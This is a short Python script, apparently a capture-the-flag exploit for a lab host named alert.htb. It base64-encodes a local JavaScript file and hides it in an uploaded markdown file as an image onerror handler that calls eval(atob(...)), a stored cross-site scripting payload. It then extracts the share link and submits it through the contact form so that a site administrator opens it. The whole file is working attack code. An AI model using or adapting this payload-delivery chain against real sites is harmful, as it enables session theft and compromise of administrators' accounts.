#!/usr/bin/python

import requests
import re
import base64

with open("./script.js") as payload:
    content = payload.read()
base64_content = base64.b64encode(content.encode()).decode()
file = ("# hello, world\n"
        "hello world\n"
        "<img onerror=\"eval(atob('{}'))\" src=\"/\">".format(base64_content))

post_files = {"file": ("test.md", file, "text/markdown")}
post_url = "http://alert.htb/visualizer.php"
post_resp = requests.post(post_url, files=post_files)
sharing_url = re.findall("http://alert.htb/.*\\.md", post_resp.text)

print("sharing_url: {}".format(sharing_url[0]))

contact_url = "http://alert.htb/contact.php"
contact_data = {"email": "a@a.a", "message": sharing_url}
contact_resp = requests.post(contact_url, data=contact_data)
if contact_resp.ok:
    print("Success")
else:
    print("Failed")